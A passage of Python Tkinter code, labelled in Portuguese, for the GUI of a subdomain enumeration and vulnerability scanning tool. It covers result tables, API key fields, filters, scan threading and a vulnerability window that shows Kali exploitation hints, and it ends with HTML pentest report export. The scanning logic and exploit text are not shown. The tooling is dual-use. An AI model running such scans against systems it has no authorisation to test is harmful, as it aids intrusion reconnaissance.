            ('301', '301 Redirect', '#fdcb6e'),
            ('302', '302 Found', '#ffeaa7'),
            ('403', '403 Forbidden', self.colors['orange']),
            ('404', '404 Not Found', self.colors['red']),
            ('500', '500 Error', '#fd79a8'),
            ('no_ip', 'Sem IP', '#636e72'),
            ('no_status', 'Sem Status', '#b2bec3'),
        ]:
            var = tk.BooleanVar(value=(code == 'all'))
            self.status_filters[code] = var
            tk.Checkbutton(
                fi, text=label, variable=var,
                bg=self.colors['bg2'], fg=color,
                selectcolor=self.colors['bg3'],
                activebackground=self.colors['bg2'],
                activeforeground=color,
                font=('Segoe UI', 9, 'bold'),
                command=lambda c=code: self.on_status_filter_change(c)
            ).pack(side=tk.LEFT, padx=6)

        self.filter_count_label = tk.Label(
            fi, text="", bg=self.colors['bg2'], fg='#888',
            font=('Segoe UI', 9)
        )
        self.filter_count_label.pack(side=tk.RIGHT, padx=10)

        tree_f = ttk.Frame(results_f)
        tree_f.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        cols = ('num', 'subdomain', 'ip', 'status', 'source')
        self.tree = ttk.Treeview(
            tree_f, columns=cols, show='headings',
            selectmode='extended'
        )
        for cid, text, w, mw in [
            ('num', '#', 50, 40),
            ('subdomain', 'Subdomínio', 400, 200),
            ('ip', 'IP', 150, 100),
            ('status', 'HTTP Status', 120, 80),
            ('source', 'Fonte', 150, 100),
        ]:
            self.tree.heading(
                cid, text=text,
                command=lambda c=cid: self.sort_tree(c)
            )
            self.tree.column(cid, width=w, minwidth=mw)

        sb = ttk.Scrollbar(
            tree_f, orient=tk.VERTICAL, command=self.tree.yview
        )
        self.tree.configure(yscrollcommand=sb.set)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        sb.pack(side=tk.RIGHT, fill=tk.Y)

        self.tree_menu = tk.Menu(
            self.root, tearoff=0,
            bg=self.colors['bg2'], fg=self.colors['fg']
        )
        self.tree_menu.add_command(
            label="📋 Copiar Subdomínio", command=self.copy_subdomain
        )
        self.tree_menu.add_command(
            label="📋 Copiar IP", command=self.copy_ip
        )
        self.tree_menu.add_command(
            label="🌐 Abrir no Navegador", command=self.open_in_browser
        )
        self.tree.bind("<Button-3>", self.show_tree_menu)

        # API Keys Tab
        api_f = ttk.Frame(self.notebook)
        self.notebook.add(api_f, text="  🔑 API Keys  ")
        api_inner = tk.Frame(api_f, bg=self.colors['bg'])
        api_inner.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        tk.Label(
            api_inner,
            text="🔑 Configuração de API Keys (Opcional)",
            font=('Segoe UI', 14, 'bold'),
            bg=self.colors['bg'], fg=self.colors['accent']
        ).pack(anchor=tk.W, pady=(0, 20))

        self.api_vars = {}
        for key, name in [
            ('securitytrails', 'SecurityTrails'),
            ('virustotal', 'VirusTotal'),
            ('shodan', 'Shodan'),
        ]:
            f = tk.Frame(
                api_inner, bg=self.colors['bg2'],
                highlightbackground=self.colors['border'],
                highlightthickness=1
            )
            f.pack(fill=tk.X, pady=5)
            inn = tk.Frame(f, bg=self.colors['bg2'])
            inn.pack(fill=tk.X, padx=15, pady=10)
            tk.Label(
                inn, text=f"{name}:",
                font=('Segoe UI', 11, 'bold'),
                bg=self.colors['bg2'], fg=self.colors['fg'],
                width=18, anchor=tk.W
            ).pack(side=tk.LEFT)
            var = tk.StringVar()
            entry = tk.Entry(
                inn, textvariable=var, font=('Consolas', 10),
                bg=self.colors['bg3'], fg=self.colors['fg'],
                insertbackground=self.colors['fg'],
                relief=tk.FLAT, bd=5, show='•', width=50
            )
            entry.pack(side=tk.LEFT, padx=10)
            tk.Button(
                inn, text="👁", font=('Segoe UI', 9),
                bg=self.colors['bg3'], fg=self.colors['fg'],
                relief=tk.FLAT, cursor='hand2',
                command=lambda e=entry: self.toggle_visibility(e)
            ).pack(side=tk.LEFT)
            self.api_vars[key] = var

        # BOTTOM
        bottom = tk.Frame(main, bg=self.colors['bg'])
        bottom.pack(fill=tk.X, pady=(10, 0))
        export_f = tk.Frame(bottom, bg=self.colors['bg'])
        export_f.pack(fill=tk.X)
        self.status_label = tk.Label(
            export_f, text="Pronto para iniciar scan",
            font=('Segoe UI', 10),
            bg=self.colors['bg'], fg='#888'
        )
        self.status_label.pack(side=tk.LEFT)
        for text, cmd in [
            ("💾 Salvar TXT", self.save_txt),
            ("🌐 Salvar HTML (com Vulnerabilidades)", self.save_html),
        ]:
            tk.Button(
                export_f, text=text, font=('Segoe UI', 9, 'bold'),
                bg=self.colors['bg2'], fg=self.colors['fg'],
                activebackground=self.colors['accent'],
                relief=tk.FLAT, bd=0, padx=12, pady=5, command=cmd
            ).pack(side=tk.RIGHT, padx=3)

    # ── JANELA DE DETALHE DA VULNERABILIDADE ──

    def show_vuln_detail(self, event):
        sel = self.vuln_tree.selection()
        if not sel:
            return
        vals = self.vuln_tree.item(sel[0])['values']
        host, name = str(vals[1]), str(vals[2])
        v = next((x for x in self.vulnerabilities
                  if x['name'] == name and x.get('host') == host), None)
        if not v:
            return

        win = tk.Toplevel(self.root)
        win.title(f"{v['severity']} — {v['name']}")
        win.geometry("850x650")
        win.configure(bg=self.colors['bg'])

        header = tk.Frame(win, bg=self.colors['bg2'])
        header.pack(fill=tk.X)
        sev_color = {'CRITICAL': '#e84393', 'HIGH': '#e17055',
                     'MEDIUM': '#fdcb6e', 'LOW': '#b2bec3',
                     'INFO': '#74b9ff'}.get(v['severity'], '#b2bec3')
        tk.Label(header, text=f"[{v['severity']}] {v['name']}",
                 font=('Segoe UI', 13, 'bold'), bg=self.colors['bg2'],
                 fg=sev_color).pack(anchor=tk.W, padx=15, pady=10)
        tk.Label(header,
                 text=f"Host: {v.get('host','')}  |  "
                      f"CVE/CWE: {v.get('cve','-')}",
                 font=('Segoe UI', 10), bg=self.colors['bg2'],
                 fg='#888').pack(anchor=tk.W, padx=15, pady=(0, 10))

        if v.get('cve_url'):
            tk.Button(
                header, text="🔗 Abrir CVE / Referência no Navegador",
                font=('Segoe UI', 10, 'bold'), bg=self.colors['accent'],
                fg='white', relief=tk.FLAT, padx=14, pady=6,
                command=lambda u=v['cve_url']: self._open_url(u)
            ).pack(anchor=tk.W, padx=15, pady=(0, 12))

        txt = scrolledtext.ScrolledText(
            win, font=('Consolas', 10), bg='#0a0a1a', fg='#e0e0e0',
            relief=tk.FLAT, bd=10, wrap=tk.WORD)
        txt.pack(fill=tk.BOTH, expand=True)

        txt.tag_config('sec', font=('Consolas', 11, 'bold'),
                       foreground='#667eea')
        txt.tag_config('kal', font=('Consolas', 11, 'bold'),
                       foreground='#e17055')
        txt.tag_config('fix', font=('Consolas', 11, 'bold'),
                       foreground='#00b894')

        txt.insert(tk.END, "🔍 EVIDÊNCIA:\n", 'sec')
        txt.insert(tk.END, f"{v.get('evidence','')}\n\n")
        txt.insert(tk.END,
                   "💥 EXPLORAÇÃO COM FERRAMENTAS DO KALI LINUX:\n", 'kal')
        txt.insert(tk.END, f"{v.get('kali','')}\n\n")
        txt.insert(tk.END, "🛠 COMO CORRIGIR:\n", 'fix')
        txt.insert(tk.END, f"{v.get('fix','')}\n\n")
        txt.insert(tk.END, "🔗 REFERÊNCIA CVE:\n", 'sec')
        txt.insert(tk.END,
                   f"{v.get('cve','-')}\n{v.get('cve_url','')}\n")
        txt.config(state=tk.DISABLED)

    def _open_url(self, url):
        import webbrowser
        webbrowser.open(url)

    # ── STATUS FILTER LOGIC ──

    def on_status_filter_change(self, changed):
        if changed == 'all':
            if self.status_filters['all'].get():
                for code, var in self.status_filters.items():
                    if code != 'all':
                        var.set(False)
        else:
            self.status_filters['all'].set(False)
            any_sel = any(
                var.get() for code, var in self.status_filters.items()
                if code != 'all'
            )
            if not any_sel:
                self.status_filters['all'].set(True)
        self.apply_filters()

    def apply_filters(self):
        ftext = self.filter_var.get().lower()
        show_all = self.status_filters['all'].get()
        selected = set()
        show_no_ip = False
        show_no_status = False

        if not show_all:
            for code, var in self.status_filters.items():
                if code == 'all':
                    continue
                if var.get():
                    if code == 'no_ip':
                        show_no_ip = True
                    elif code == 'no_status':
                        show_no_status = True
                    else:
                        selected.add(code)

        for item in self.tree.get_children():
            self.tree.delete(item)

        idx = 0
        for sub in sorted(self.results.keys()):
            info = self.results[sub]
            ip = info.get('ip', '')
            status = info.get('status', '')
            source = info.get('source', '')

            if ftext:
                s = f"{sub} {ip} {status} {source}".lower()
                if ftext not in s:
                    continue

            if not show_all:
                match = False
                if show_no_ip and not ip:
                    match = True
                if show_no_status and ip and not status:
                    match = True
                if status in selected:
                    match = True
                if not match:
                    continue

            idx += 1
            self.tree.insert('', tk.END, values=(
                idx, sub, ip or '—', status or '—', source
            ))

        self.filter_count_label.config(
            text=f"Mostrando: {idx} / {len(self.results)}"
        )

    # ── CALLBACKS ──

    def log_message(self, message, tag="info"):
        def _u():
            self.console.insert(tk.END, message + '\n', tag)
            self.console.see(tk.END)
        self.root.after(0, _u)

    def update_progress(self, current, total, phase):
        def _u():
            if total > 0:
                pct = int((current / total) * 100)
                self.progress['value'] = pct
                self.progress_label.config(text=f"{pct}%")
                labels = {
                    'sources': f"Fontes: {current}/{total}",
                    'resolve': f"DNS: {current}/{total}",
                    'http': f"HTTP: {current}/{total}"
                }
                self.progress_detail.config(
                    text=labels.get(phase, f"{current}/{total}")
                )
        self.root.after(0, _u)

    def on_result_found(self, subdomain, info):
        def _u():
            ip = info.get('ip', '')
            status = info.get('status', '')
            source = info.get('source', '')

            if subdomain in self.tree_items:
                iid = self.tree_items[subdomain]
                try:
                    cur = self.tree.item(iid, 'values')
                    self.tree.item(iid, values=(
                        cur[0], subdomain, ip or '—',
                        status or '—', source
                    ))
                except tk.TclError:
                    pass
            else:
                idx = len(self.tree_items) + 1
                iid = self.tree.insert('', tk.END, values=(
                    idx, subdomain, ip or '—',
                    status or '—', source
                ))
                self.tree_items[subdomain] = iid
                self.tree.see(iid)
        self.root.after(0, _u)

    def on_vuln_found(self, host, vuln):
        key = (host, vuln['name'])
        if not any(
            (v.get('host'), v['name']) == key
            for v in self.vulnerabilities
        ):
            self.vulnerabilities.append(vuln)

        def _u():
            self.vuln_tree.insert('', tk.END, values=(
                vuln['severity'], host, vuln['name'],
                vuln.get('cve', ''),
                (vuln.get('kali', '').splitlines()[0][:40]
                 if vuln.get('kali') else '')
            ), tags=(vuln['severity'],))
            self.stat_labels['vulns'].config(
                text=str(len(self.vulnerabilities)))
            crit = sum(1 for v in self.vulnerabilities
                       if v['severity'] == 'CRITICAL')
            self.stat_labels['crit'].config(text=str(crit))
        self.root.after(0, _u)

    # ── SCAN ──

    def start_scan(self):
        domain = self.domain_var.get().strip()
        if not domain:
            messagebox.showwarning("Aviso", "Insira um domínio.")
            return
        domain = (domain.replace('http://', '')
                  .replace('https://', '').split('/')[0].strip())
        if '.' not in domain:
            messagebox.showwarning("Aviso", "Domínio inválido.")
            return

        self.current_domain = domain
        self.is_running = True
        self.tree_items = {}
        self.vulnerabilities = []
        self.results = {}
        self.console.delete(1.0, tk.END)
        for t in (self.tree, self.vuln_tree):
            for item in t.get_children():
                t.delete(item)
        for k in self.stat_labels:
            self.stat_labels[k].config(text="0")
        self.progress['value'] = 0
        self.progress_label.config(text="0%")
        self.progress_detail.config(text="Iniciando...")
        self.status_filters['all'].set(True)
        for c, v in self.status_filters.items():
            if c != 'all':
                v.set(False)
        self.filter_var.set('')

        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.domain_entry.config(state=tk.DISABLED)
        self.status_label.config(
            text=f"Scanning {domain}...",
            fg=self.colors['accent']
        )

        api_keys = {
            k: v.get().strip()
            for k, v in self.api_vars.items()
            if v.get().strip()
        }
        self.enumerator = SubdomainEnumerator(
            callback=self.log_message,
            progress_callback=self.update_progress,
            result_callback=self.on_result_found,
            api_keys=api_keys
        )

        def run():
            try:
                self.results = self.enumerator.enumerate(
                    domain, resolve=self.resolve_var.get(),
                    check_status=self.http_var.get(), threads=5,
                )

                if (self.vuln_var.get() and self.results
                        and not self.enumerator.stop_flag):
                    self.scanner = VulnerabilityScanner(
                        callback=self.log_message,
                        vuln_callback=self.on_vuln_found)
                    self.log_message(
                        "\n[*] Iniciando análise de vulnerabilidades...",
                        "header")
                    self.scanner.scan_all(self.results)
            except Exception as e:
                if self.enumerator and not self.enumerator.stop_flag:
                    self.log_message(f"\n[ERRO] {e}", "error")
            finally:
                if self.enumerator:
                    self.results = self.enumerator.found_subdomains
                self.root.after(0, self.scan_complete)

        threading.Thread(target=run, daemon=True).start()
        self.notebook.select(0)

    def scan_complete(self):
        self.is_running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.domain_entry.config(state=tk.NORMAL)

        if self.enumerator and self.enumerator.stop_flag:
            self.status_label.config(
                text=f"Parado pelo usuário — {len(self.results)} "
                     f"subdomínios, {len(self.vulnerabilities)} "
                     f"vulnerabilidades (parciais)",
                fg=self.colors['orange']
            )
            self.progress_detail.config(
                text="Interrompido! Dados parciais salvos.")
        else:
            self.progress['value'] = 100
            self.progress_label.config(text="100%")
            self.progress_detail.config(text="Concluído!")
            self.status_label.config(
                text=f"Concluído — {len(self.results)} subdomínios, "
                     f"{len(self.vulnerabilities)} vulnerabilidades",
                fg=self.colors['green']
            )

        self.log_message(
            "\n[✓] Finalizado. Use 'Salvar HTML' para o relatório "
            "completo.", "success")
        self.apply_filters()

    def stop_scan(self):
        if self.enumerator:
            self.enumerator.stop()
        if self.scanner:
            self.scanner.stop()
        self.status_label.config(
            text="Abortando imediatamente...", fg=self.colors['red']
        )
        self.progress_detail.config(
            text="Liberando recursos e salvando dados...")

    # ── SORT ──

    def sort_tree(self, col):
        self.sort_reverse[col] = not self.sort_reverse.get(col, False)
        items = [
            (self.tree.set(i, col), i)
            for i in self.tree.get_children('')
        ]
        try:
            if col == 'num':
                items.sort(
                    key=lambda t: int(t[0]) if t[0].isdigit() else 0,
                    reverse=self.sort_reverse[col]
                )
            else:
                items.sort(
                    key=lambda t: t[0].lower(),
                    reverse=self.sort_reverse[col]
                )
        except (ValueError, TypeError):
            items.sort(key=lambda t: t[0])
        for idx, (v, i) in enumerate(items):
            self.tree.move(i, '', idx)

    # ── CONTEXT MENU ──

    def show_tree_menu(self, event):
        try:
            self.tree.selection_set(
                self.tree.identify_row(event.y)
            )
            self.tree_menu.tk_popup(event.x_root, event.y_root)
        except Exception:
            pass

    def copy_subdomain(self):
        sel = self.tree.selection()
        if sel:
            self.root.clipboard_clear()
            self.root.clipboard_append(
                self.tree.item(sel[0])['values'][1]
            )

    def copy_ip(self):
        sel = self.tree.selection()
        if sel:
            self.root.clipboard_clear()
            self.root.clipboard_append(
                self.tree.item(sel[0])['values'][2]
            )

    def open_in_browser(self):
        sel = self.tree.selection()
        if sel:
            sub = self.tree.item(sel[0])['values'][1]
            import webbrowser
            webbrowser.open(f"https://{sub}")

    def toggle_visibility(self, entry):
        entry.config(show='' if entry.cget('show') == '•' else '•')

    # ── EXPORT ──

    def save_txt(self):
        if not self.results:
            messagebox.showwarning("Aviso", "Nenhum resultado disponível.")
            return
        fp = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt")],
            initialfile=(
                f"subfinder_{self.current_domain}_"
                f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            )
        )
        if fp:
            Exporter.save_txt(self.results, fp, self.current_domain)
            messagebox.showinfo("Sucesso", f"Salvo:\n{fp}")

    def save_html(self):
        if not self.results and not self.vulnerabilities:
            messagebox.showwarning("Aviso", "Nenhum resultado disponível.")
            return
        fp = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML files", "*.html")],
            initialfile=(
                f"pentest_{self.current_domain}_"
                f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
            )
        )
        if fp:
            Exporter.save_html(
                self.results, fp, self.current_domain,
                self.vulnerabilities)
            messagebox.showinfo("Sucesso", f"Salvo:\n{fp}")
            self.status_label.config(
                text=f"Salvo: {os.path.basename(fp)}",
                fg=self.colors['green']
            )
            import webbrowser
            webbrowser.open(f'file://{os.path.abspath(fp)}')


# ============================================================
# MAIN
# ============================================================

def main():
    root = tk.Tk()
    try:
        root.iconbitmap(default='')
    except Exception:
        pass
    app = SubFinderGUI(root)
    root.update_idletasks()
    x = (root.winfo_screenwidth() // 2) - 600
    y = (root.winfo_screenheight() // 2) - 425
    root.geometry(f"1200x850+{x}+{y}")
    root.mainloop()


if __name__ == "__main__":
    main()
